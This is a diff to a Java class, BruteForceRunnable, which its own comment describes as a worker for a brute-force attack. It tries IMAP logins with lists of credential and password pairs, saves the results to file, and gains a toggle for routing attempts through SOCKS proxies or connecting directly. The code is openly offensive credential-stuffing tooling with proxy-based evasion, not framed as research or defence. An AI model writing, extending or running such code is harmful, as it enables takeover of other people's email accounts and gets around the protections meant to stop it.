@@ -21,7 +21,7 @@ import java.nio.file.StandardOpenOption;
  * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
  *
  * @author Rudolf Barbu
- * @version 1.0.0
+ * @version 1.0.1
  */
 @RequiredArgsConstructor
 public class BruteForceRunnable implements Runnable
@@ -58,6 +58,12 @@ public class BruteForceRunnable implements Runnable
     private static Path workingDirectory;
 
     /**
+     * Indicator for proxy usage
+     */
+    @Setter
+    private static boolean useProxies;
+
+    /**
      * Callback interface, which is used to deliver messages to service
      */
     private final BruteForceCallback bruteForceCallback;
@@ -74,17 +80,24 @@ public class BruteForceRunnable implements Runnable
         ckImap.put_StartTls(SSL_AND_TLS);
         ckImap.put_Port(IMAP_PORT);
 
-        ckImap.put_ConnectTimeout(CONNECTION_TIMEOUT);
-        ckImap.put_SocksVersion(SOCKS_VERSION);
+        if (useProxies)
+        {
+            ckImap.put_ConnectTimeout(CONNECTION_TIMEOUT);
+            ckImap.put_SocksVersion(SOCKS_VERSION);
+        }
 
         try
         {
             Source source;
             while (((source = DataContainer.getNextSource()) != null) && !Thread.currentThread().isInterrupted())
             {
-                if (failedToConnect(ckImap))
+                if (useProxies && failedToConnect(ckImap))
                 {
                     break;
+                }
+                else
+                {
+                    ckImap.Connect(IMAP_SERVER);
                 }
 
                 saveSourceToFile(source, ckImap.Login(source.getCredential(), source.getPassword()));
